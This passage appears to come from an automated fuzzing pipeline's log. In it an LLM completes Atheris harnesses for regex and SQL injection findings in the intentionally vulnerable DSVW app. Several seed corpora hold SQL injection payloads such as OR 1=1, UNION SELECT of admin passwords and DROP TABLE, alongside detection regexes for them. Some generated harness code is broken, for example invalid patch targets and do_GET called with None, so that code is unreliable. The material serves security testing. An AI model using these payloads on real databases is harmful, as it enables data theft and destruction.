    _CORPUS_DIR = "/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_regex_injection_dsvw_py_26"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````


### LLM Response (Iteration 1)

````text
import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-dsvw"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from dsvw import do_GET
    from flask import Flask, request


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("\\(.*\\)", re.IGNORECASE),

    re.compile("\\[.*\\]", re.IGNORECASE),

    re.compile(".*\\*.*", re.IGNORECASE),

    re.compile(".*\\+.*", re.IGNORECASE),

    re.compile("\\{.*\\}", re.IGNORECASE),

    re.compile(".*\\?\\?.*", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_REGEX_INJECTION: Unescaped user input in regex pattern — captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = []
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : re.findall
# target_arg_index : 0
# target_arg_name  : pattern
# input_strategy   : flask_view
# signature        : def do_GET(self)
# condition        : captured regex pattern contains user-controlled input without escaping, enabling ReDoS or data extraction
# capture_what     : regex pattern passed to re.findall
# skip_hint        : len(captured) > 1000 or '\\' in captured
# ========================================


# === RECORDED_CALL SKELETON ===
# TODO: Complete TestOneInput following these steps:
# 1. Generate inputs using FuzzedDataProvider.
# 2. Apply skip_hint (if applicable).
# 3. Mock the patch target using patch/MagicMock.
# 4. Call target function inside the mock context.
# 5. Compare mock call arguments against _COMPILED_PATTERNS.
# 6. Propagate RuntimeError; swallow other exceptions.
# ==========================================

app = Flask(__name__)

def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    # NOTE: For string inputs, use fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    #       instead of ConsumeUnicodeNoSurrogates() to preserve raw seed payloads.
    
    # 1. Generate inputs from fdp
    pattern_input = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    
    # 2. Apply skip_hint
    if len(pattern_input) > 1000 or '\\' in pattern_input:
        return
    
    query_params = {
        'pattern': pattern_input
    }
    
    # 3. Mock the patch target
    with patch('re.findall', MagicMock()) as mock_findall:
        # 4. Call target function inside the mock context
        try:
            with app.test_request_context('/?pattern=' + pattern_input):
                do_GET(None)  # Pass None as self since it's not used in the function
        except RuntimeError:
            raise
        except Exception:
            pass
        
        # 5. Compare mock call arguments against _COMPILED_PATTERNS
        for call in mock_findall.call_args_list:
            captured = ""
            if call.args:
                captured = str(call.args[0])
            elif call.kwargs:
                captured = str(call.kwargs.get('pattern', ''))
            
            # Skip check if captured is empty
            if not captured:
                continue
                
            for pattern in _COMPILED_PATTERNS:
                if pattern.search(captured):
                    raise RuntimeError(_RAISE_MESSAGE.format(captured=captured, matched_pattern=pattern.pattern))


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    "(a|b)*c",
    "[a-z]+",
    "a*b+c?",
    "{1,2}",
    "??",
    "(.*)",
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_regex_injection_dsvw_py_26"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````

- Result: `generated`
- Harness: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_targets/py_regex_injection_dsvw_py_26.py`

## [6/7] py/sql-injection

- File: `dsvw.py:30`
- Target: `py_sql_injection_dsvw_py_30`
- Oracle: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_oracles/py_sql_injection_dsvw_py_30.json`
- Harness: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_targets/py_sql_injection_dsvw_py_30.py`
- Corpus: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_sql_injection_dsvw_py_30`

### System Prompt

````text
You are an expert security fuzzing engineer specializing in Python vulnerability research.
Your task is to complete an Atheris fuzz harness that detects sink-reachability bugs
(SSRF, path traversal, command injection, etc.) using a recorded_call oracle strategy.

## Your Role
You intercept a specific function call (the "sink") by mocking it, then inspect
the argument that reaches it. If the argument matches any forbidden pattern,
the oracle fires.

## Critical Oracle Rule — Read This First
The oracle fires on what REACHES the sink, not on what enters the function.
_COMPILED_PATTERNS must be applied ONLY to the argument captured at the patched
call (call.args or call.kwargs) — never to the input parameter itself.

Applying patterns to the input parameter is ALWAYS wrong for recorded_call strategy.
It causes the oracle to fire before the function executes, turning every seed
corpus entry into a false positive regardless of whether the vulnerability exists.

## Harness Completion Rules

### Structure
- Output a single complete Python file. No markdown. No explanation. No code fences.
- You may add helper functions, imports, or constants outside TestOneInput.
- Do not modify any section marked FIXED CONTRACTS.

### TestOneInput — Required Logic

1. INPUT GENERATION
   - Use FuzzedDataProvider to generate inputs for all tainted params based on
     the function signature.

   - STRING INPUTS REGULATION:
     * Always generate string/unicode inputs by consuming bytes and decoding them to preserve raw payloads:
       val = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
     * Do NOT use ConsumeUnicodeNoSurrogates() for arguments that need to match exact exploit patterns (like shell commands, import statement strings).

   - Buffer allocation strategy (inferred from signature):
       - MULTIPLE params → split the buffer proportionally by param count.
         For str/bytes params, divide remaining bytes evenly; consume the
         last str/bytes param with remaining bytes. Fixed-size types (int,
         float, bool) consume their natural byte width first, then split
         the remainder among str/bytes params.
       - FORBIDDEN: Do NOT use ConsumeIntInRange() to select a strategy
         index or branch — this prevents the fuzzer from mutating payload.

2. SKIP CONDITION
   - Apply the skip_hint early in TestOneInput.
   - If input does not meet minimum criteria, return immediately.
   - This avoids wasting fuzzer cycles on irrelevant inputs.
   - The skip condition filters INPUT only — it has no relation to the oracle check.

3. MOCK SETUP
   - Patch the exact target specified in patch_target.
   - Mock only the patched sink. Do NOT mock validation functions, input parsers,
     or any function called BEFORE the sink — those must execute with real logic
     so that the fuzzer tests actual data flow to the sink.
   - Mock return value must be realistic enough for the target function to continue
     executing past the patched call — use MagicMock with appropriate spec.
   - Use `with patch(...) as mock_obj:` scoping.

4. FUNCTION CALL
   - Call the target function inside the patch context.
   - Wrap in try/except Exception: pass — but keep RuntimeError re-raise outside.

5. ORACLE CHECK  ← must be OUTSIDE the function call try/except, INSIDE the patch context
   - After the target function call, iterate mock_obj.call_args_list.
   - For each call, extract the captured argument:
     * Check call.args[target_arg_index] first.
     * Fall back to call.kwargs.get(target_arg_name) if args is empty.
     * kwargs fallback must use a string key ("url", "request", etc.) — never None.
   - Convert captured to str before pattern matching.
   - Run every pattern in _COMPILED_PATTERNS against the captured value.
   - On any match: raise RuntimeError(_RAISE_MESSAGE)

6. EXCEPTION HANDLING
   - except RuntimeError: raise        → never swallow oracle signals
   - except Exception: pass            → swallow all other exceptions
   - Never use bare except.

### Input Generation Strategy
- Think about what values would cause the tainted param to reach the sink.
- Generate variations covering: scheme prefixes, IP formats, encoding variants,
  edge cases from trigger_patterns.
- Do not limit generation to only the seed corpus.

### What NOT to Do
- Do NOT run _COMPILED_PATTERNS against the input parameter — patterns must be
  applied only to the argument captured at the sink.
- Do NOT mock any function called before the sink — validation and parsing logic
  must run with real behavior.
- Do NOT use call.kwargs.get(None) — always use a named string key.
- Do NOT place the oracle check inside the function call try/except block —
  RuntimeError from the oracle must propagate to Atheris.

### Seed Corpus Rules (CRITICAL)
- Define _SEED_CORPUS as a module-level list OUTSIDE TestOneInput.
- Populate it with at least 6 bypass-oriented entries derived from
  trigger_patterns and condition_desc.
- Entries must be designed to reach the sink and trigger oracle patterns.
  Cover: internal IPs, metadata endpoints, file URIs, mixed-case schemes,
  encoded variants.
- NEVER reference _SEED_CORPUS inside TestOneInput.
- NEVER use ConsumeBool() or ConsumeIntInRange() to select from _SEED_CORPUS.
- Seeds are exported to disk at startup (see __main__ block in template).
  libFuzzer will mutate their raw bytes directly — this is how coverage-guided
  mutation works correctly.

## Quality Checklist (verify before outputting)
[ ] All tainted params are fuzzed via FuzzedDataProvider, consuming len(data) for single param
[ ] No ConsumeBool()/ConsumeIntInRange() used to index into a seed list inside TestOneInput
[ ] _SEED_CORPUS defined at module level, outside TestOneInput
[ ] _SEED_CORPUS has at least 6 entries derived from trigger_patterns
[ ] String inputs generated using ConsumeBytes().decode() instead of ConsumeUnicodeNoSurrogates() to preserve seeds
[ ] skip_condition applied to input only — not used in oracle
[ ] patch_target mocked correctly, no pre-sink functions mocked
[ ] Oracle check is OUTSIDE the function call try/except
[ ] Oracle check applies _COMPILED_PATTERNS to captured sink argument, NOT to input
[ ] Both call.args and call.kwargs checked with string key (never None)
[ ] captured converted to str before pattern matching
[ ] RuntimeError is re-raised, never swallowed
[ ] No markdown or explanation in output
````


### User Prompt

````text
Complete the following partial Atheris harness by filling in the TestOneInput body.
Output the complete Python script only. No markdown, no explanation.

# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/sql-injection
# function : do_GET
# file     : dsvw.py
# ================================================================
import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-dsvw"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from dsvw import do_GET


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("OR\\s+1\\s*=\\s*1", re.IGNORECASE),

    re.compile("UNION\\s+SELECT", re.IGNORECASE),

    re.compile("\\-\\-\\s*$", re.IGNORECASE),

    re.compile("['\"]\\s*(OR|AND)\\s*[\\w\\d]+\\s*=\\s*[\\w\\d]+", re.IGNORECASE),

    re.compile("(DROP|DELETE|UPDATE|INSERT)\\s+", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_SQL-INJECTION: SQL injection detected in query — captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "self.path", "index": 0, "type": "str"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : dsvw.ReqHandler.do_GET.cursor.execute
# target_arg_index : 0
# target_arg_name  : None
# input_strategy   : flask_view
# signature        : def do_GET(self)
# condition        : SQL query contains user-injected SQL fragments like ' OR 1=1-- or UNION SELECT
# capture_what     : SQL query string passed to execute
# skip_hint        : not ('id' in query and 'SELECT' in query)
# ========================================


# === RECORDED_CALL SKELETON ===
# TODO: Complete TestOneInput following these steps:
# 1. Generate inputs using FuzzedDataProvider.
# 2. Apply skip_hint (if applicable).
# 3. Mock the patch target using patch/MagicMock.
# 4. Call target function inside the mock context.
# 5. Compare mock call arguments against _COMPILED_PATTERNS.
# 6. Propagate RuntimeError; swallow other exceptions.
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    # NOTE: For string inputs, use fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    #       instead of ConsumeUnicodeNoSurrogates() to preserve raw seed payloads.
    
    # 1. Generate inputs from fdp
    
    param_self.path = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    
    query_params = {
        
        "self.path": param_self.path,
        
    }
    
    # 2. Wrap in Flask Request Context
    with app.test_request_context(query_string=query_params):
        pass  # [FILL HERE — follow the skeleton above]
    


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    # [FILL HERE — at least 6 bypass-attempt strings]
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_sql_injection_dsvw_py_30"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````


### LLM Response (Iteration 1)

````text
import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-dsvw"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from dsvw import do_GET


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("OR\\s+1\\s*=\\s*1", re.IGNORECASE),

    re.compile("UNION\\s+SELECT", re.IGNORECASE),

    re.compile("\\-\\-\\s*$", re.IGNORECASE),

    re.compile("['\"]\\s*(OR|AND)\\s*[\\w\\d]+\\s*=\\s*[\\w\\d]+", re.IGNORECASE),

    re.compile("(DROP|DELETE|UPDATE|INSERT)\\s+", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_SQL-INJECTION: SQL injection detected in query — captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "self.path", "index": 0, "type": "str"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : dsvw.ReqHandler.do_GET.cursor.execute
# target_arg_index : 0
# target_arg_name  : None
# input_strategy   : flask_view
# signature        : def do_GET(self)
# condition        : SQL query contains user-injected SQL fragments like ' OR 1=1-- or UNION SELECT
# capture_what     : SQL query string passed to execute
# skip_hint        : not ('id' in query and 'SELECT' in query)
# ========================================


# === RECORDED_CALL SKELETON ===
# TODO: Complete TestOneInput following these steps:
# 1. Generate inputs using FuzzedDataProvider.
# 2. Apply skip_hint (if applicable).
# 3. Mock the patch target using patch/MagicMock.
# 4. Call target function inside the mock context.
# 5. Compare mock call arguments against _COMPILED_PATTERNS.
# 6. Propagate RuntimeError; swallow other exceptions.
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    # NOTE: For string inputs, use fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    #       instead of ConsumeUnicodeNoSurrogates() to preserve raw seed payloads.
    
    # 1. Generate inputs from fdp
    
    param_self_path = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    
    # 2. Apply skip_hint
    if not ('id' in param_self_path and 'SELECT' in param_self_path):
        return
    
    # Create a mock request handler object
    class MockRequestHandler:
        def __init__(self, path):
            self.path = path
            self.wfile = MagicMock()
            self.headers = {}
            
        def send_response(self, code):
            pass
            
        def send_header(self, keyword, value):
            pass
            
        def end_headers(self):
            pass
            
    # Create request handler instance
    handler = MockRequestHandler(param_self_path)
    
    # 3. Mock the patch target
    with patch('dsvw.ReqHandler.do_GET.cursor.execute') as mock_execute:
        mock_cursor = MagicMock()
        mock_execute.return_value = None
        mock_cursor.execute = mock_execute
        # Set the cursor attribute on the handler
        handler.cursor = mock_cursor
        
        try:
            # 4. Call target function inside the mock context
            do_GET(handler)
        except RuntimeError:
            raise
        except Exception:
            pass
        
        # 5. Compare mock call arguments against _COMPILED_PATTERNS
        for call in mock_execute.call_args_list:
            captured = ""
            if call.args:
                captured = str(call.args[0])
            # Convert captured to str before pattern matching
            for pattern in _COMPILED_PATTERNS:
                if pattern.search(captured):
                    raise RuntimeError(_RAISE_MESSAGE.format(captured=captured, matched_pattern=pattern.pattern))


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    "id=1 OR 1=1",
    "id=1 UNION SELECT * FROM users",
    "id=1'; DROP TABLE users; --",
    "id=1' OR '1'='1",
    "id=1'; UPDATE users SET password='new' WHERE id=1; --",
    "id=1' AND 'a'='a",
    "id=1' OR 1=1 --",
    "id=1' UNION SELECT username,password FROM admins --"
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_sql_injection_dsvw_py_30"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````

- Result: `generated`
- Harness: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_targets/py_sql_injection_dsvw_py_30.py`

## [7/7] py/sql-injection

- File: `dsvw.py:67`
- Target: `py_sql_injection_dsvw_py_67`
- Oracle: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_oracles/py_sql_injection_dsvw_py_67.json`
- Harness: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_targets/py_sql_injection_dsvw_py_67.py`
- Corpus: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_sql_injection_dsvw_py_67`

### System Prompt

````text
You are an expert security fuzzing engineer specializing in Python vulnerability research.
Your task is to complete an Atheris fuzz harness that detects sink-reachability bugs
(SSRF, path traversal, command injection, etc.) using a recorded_call oracle strategy.

## Your Role
You intercept a specific function call (the "sink") by mocking it, then inspect
the argument that reaches it. If the argument matches any forbidden pattern,
the oracle fires.

## Critical Oracle Rule — Read This First
The oracle fires on what REACHES the sink, not on what enters the function.
_COMPILED_PATTERNS must be applied ONLY to the argument captured at the patched
call (call.args or call.kwargs) — never to the input parameter itself.

Applying patterns to the input parameter is ALWAYS wrong for recorded_call strategy.
It causes the oracle to fire before the function executes, turning every seed
corpus entry into a false positive regardless of whether the vulnerability exists.

## Harness Completion Rules

### Structure
- Output a single complete Python file. No markdown. No explanation. No code fences.
- You may add helper functions, imports, or constants outside TestOneInput.
- Do not modify any section marked FIXED CONTRACTS.

### TestOneInput — Required Logic

1. INPUT GENERATION
   - Use FuzzedDataProvider to generate inputs for all tainted params based on
     the function signature.

   - STRING INPUTS REGULATION:
     * Always generate string/unicode inputs by consuming bytes and decoding them to preserve raw payloads:
       val = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
     * Do NOT use ConsumeUnicodeNoSurrogates() for arguments that need to match exact exploit patterns (like shell commands, import statement strings).

   - Buffer allocation strategy (inferred from signature):
       - MULTIPLE params → split the buffer proportionally by param count.
         For str/bytes params, divide remaining bytes evenly; consume the
         last str/bytes param with remaining bytes. Fixed-size types (int,
         float, bool) consume their natural byte width first, then split
         the remainder among str/bytes params.
       - FORBIDDEN: Do NOT use ConsumeIntInRange() to select a strategy
         index or branch — this prevents the fuzzer from mutating payload.

2. SKIP CONDITION
   - Apply the skip_hint early in TestOneInput.
   - If input does not meet minimum criteria, return immediately.
   - This avoids wasting fuzzer cycles on irrelevant inputs.
   - The skip condition filters INPUT only — it has no relation to the oracle check.

3. MOCK SETUP
   - Patch the exact target specified in patch_target.
   - Mock only the patched sink. Do NOT mock validation functions, input parsers,
     or any function called BEFORE the sink — those must execute with real logic
     so that the fuzzer tests actual data flow to the sink.
   - Mock return value must be realistic enough for the target function to continue
     executing past the patched call — use MagicMock with appropriate spec.
   - Use `with patch(...) as mock_obj:` scoping.

4. FUNCTION CALL
   - Call the target function inside the patch context.
   - Wrap in try/except Exception: pass — but keep RuntimeError re-raise outside.

5. ORACLE CHECK  ← must be OUTSIDE the function call try/except, INSIDE the patch context
   - After the target function call, iterate mock_obj.call_args_list.
   - For each call, extract the captured argument:
     * Check call.args[target_arg_index] first.
     * Fall back to call.kwargs.get(target_arg_name) if args is empty.
     * kwargs fallback must use a string key ("url", "request", etc.) — never None.
   - Convert captured to str before pattern matching.
   - Run every pattern in _COMPILED_PATTERNS against the captured value.
   - On any match: raise RuntimeError(_RAISE_MESSAGE)

6. EXCEPTION HANDLING
   - except RuntimeError: raise        → never swallow oracle signals
   - except Exception: pass            → swallow all other exceptions
   - Never use bare except.

### Input Generation Strategy
- Think about what values would cause the tainted param to reach the sink.
- Generate variations covering: scheme prefixes, IP formats, encoding variants,
  edge cases from trigger_patterns.
- Do not limit generation to only the seed corpus.

### What NOT to Do
- Do NOT run _COMPILED_PATTERNS against the input parameter — patterns must be
  applied only to the argument captured at the sink.
- Do NOT mock any function called before the sink — validation and parsing logic
  must run with real behavior.
- Do NOT use call.kwargs.get(None) — always use a named string key.
- Do NOT place the oracle check inside the function call try/except block —
  RuntimeError from the oracle must propagate to Atheris.

### Seed Corpus Rules (CRITICAL)
- Define _SEED_CORPUS as a module-level list OUTSIDE TestOneInput.
- Populate it with at least 6 bypass-oriented entries derived from
  trigger_patterns and condition_desc.
- Entries must be designed to reach the sink and trigger oracle patterns.
  Cover: internal IPs, metadata endpoints, file URIs, mixed-case schemes,
  encoded variants.
- NEVER reference _SEED_CORPUS inside TestOneInput.
- NEVER use ConsumeBool() or ConsumeIntInRange() to select from _SEED_CORPUS.
- Seeds are exported to disk at startup (see __main__ block in template).
  libFuzzer will mutate their raw bytes directly — this is how coverage-guided
  mutation works correctly.

## Quality Checklist (verify before outputting)
[ ] All tainted params are fuzzed via FuzzedDataProvider, consuming len(data) for single param
[ ] No ConsumeBool()/ConsumeIntInRange() used to index into a seed list inside TestOneInput
[ ] _SEED_CORPUS defined at module level, outside TestOneInput
[ ] _SEED_CORPUS has at least 6 entries derived from trigger_patterns
[ ] String inputs generated using ConsumeBytes().decode() instead of ConsumeUnicodeNoSurrogates() to preserve seeds
[ ] skip_condition applied to input only — not used in oracle
[ ] patch_target mocked correctly, no pre-sink functions mocked
[ ] Oracle check is OUTSIDE the function call try/except
[ ] Oracle check applies _COMPILED_PATTERNS to captured sink argument, NOT to input
[ ] Both call.args and call.kwargs checked with string key (never None)
[ ] captured converted to str before pattern matching
[ ] RuntimeError is re-raised, never swallowed
[ ] No markdown or explanation in output
````


### User Prompt

````text
Complete the following partial Atheris harness by filling in the TestOneInput body.
Output the complete Python script only. No markdown, no explanation.

# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/sql-injection
# function : do_GET
# file     : dsvw.py
# ================================================================
import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-dsvw"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from dsvw import do_GET


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("SELECT \\* FROM users WHERE username='[^']*' AND password='[^']*'", re.IGNORECASE),

    re.compile("SELECT \\* FROM users WHERE username='.*' OR '.*'=.*", re.IGNORECASE),

    re.compile("SELECT \\* FROM users WHERE username='.*';.*", re.IGNORECASE),

    re.compile("SELECT \\* FROM users WHERE username='.*' UNION SELECT .*", re.IGNORECASE),

    re.compile("SELECT \\* FROM users WHERE username='.*'--.*", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_SQL-INJECTION: SQL injection detected - captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = []
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : dsvw.ReqHandler.do_GET.cursor.execute
# target_arg_index : 0
# target_arg_name  : None
# input_strategy   : flask_view
# signature        : def do_GET(self)
# condition        : SQL query contains unsanitized user input patterns that bypass weak regex filtering
# capture_what     : SQL query string passed to execute
# skip_hint        : False
# ========================================


# === RECORDED_CALL SKELETON ===
# TODO: Complete TestOneInput following these steps:
# 1. Generate inputs using FuzzedDataProvider.
# 2. Apply skip_hint (if applicable).
# 3. Mock the patch target using patch/MagicMock.
# 4. Call target function inside the mock context.
# 5. Compare mock call arguments against _COMPILED_PATTERNS.
# 6. Propagate RuntimeError; swallow other exceptions.
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    # NOTE: For string inputs, use fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    #       instead of ConsumeUnicodeNoSurrogates() to preserve raw seed payloads.
    
    # 1. Generate inputs from fdp
    
    query_params = {
        
    }
    
    # 2. Wrap in Flask Request Context
    with app.test_request_context(query_string=query_params):
        pass  # [FILL HERE — follow the skeleton above]
    


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    # [FILL HERE — at least 6 bypass-attempt strings]
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_sql_injection_dsvw_py_67"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````


### LLM Response (Iteration 1)

````text
import atheris
import sys
import re
import os
from unittest.mock import patch, MagicMock
from urllib.parse import urlencode

REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-dsvw"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():
    from dsvw import ReqHandler
    from flask import Flask

app = Flask(__name__)

# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [
    re.compile("SELECT \\* FROM users WHERE username='[^']*' AND password='[^']*'", re.IGNORECASE),
    re.compile("SELECT \\* FROM users WHERE username='.*' OR '.*'=.*", re.IGNORECASE),
    re.compile("SELECT \\* FROM users WHERE username='.*';.*", re.IGNORECASE),
    re.compile("SELECT \\* FROM users WHERE username='.*' UNION SELECT .*", re.IGNORECASE),
    re.compile("SELECT \\* FROM users WHERE username='.*'--.*", re.IGNORECASE),
]
_RAISE_MESSAGE  = "PY_SQL-INJECTION: SQL injection detected - captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = []
# ========================================

# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
_SEED_CORPUS = [
    "username=admin' OR '1'='1&password=pass",
    "username=admin'; DROP TABLE users;--&password=pass",
    "username=admin' UNION SELECT username, password FROM admins--&password=pass",
    "username=admin' OR 1=1--&password=pass",
    "username=admin' AND 1=0 UNION SELECT 'admin', 'owned'--&password=pass",
    "username=admin'/**/OR/**/'1'='1&password=pass"
]

def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    
    # Generate inputs from fdp
    username = fdp.ConsumeBytes(512).decode('utf-8', errors='ignore')
    password = fdp.ConsumeBytes(512).decode('utf-8', errors='ignore')
    
    query_params = {
        'username': username,
        'password': password
    }
    
    # Wrap in Flask Request Context
    with app.test_request_context(query_string=query_params):
        # Mock the patch target
        with patch('dsvw.ReqHandler.do_GET.cursor.execute', spec=True) as mock_execute:
            try:
                # Create a mock request handler
                handler = ReqHandler()
                handler.path = '/?' + urlencode(query_params)
                handler.wfile = MagicMock()
                handler.rfile = MagicMock()
                handler.send_response = MagicMock()
                handler.send_header = MagicMock()
                handler.end_headers = MagicMock()
                
                # Call the target function
                handler.do_GET()
            except RuntimeError:
                raise
            except Exception:
                pass
            
            # Oracle check - outside the try/except
            for call in mock_execute.call_args_list:
                captured = ""
                if call.args:
                    captured = str(call.args[0])
                elif call.kwargs:
                    captured = str(call.kwargs.get('sql', ''))
                
                for pattern in _COMPILED_PATTERNS:
                    if pattern.search(captured):
                        raise RuntimeError(_RAISE_MESSAGE.format(captured=captured, matched_pattern=pattern.pattern))


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
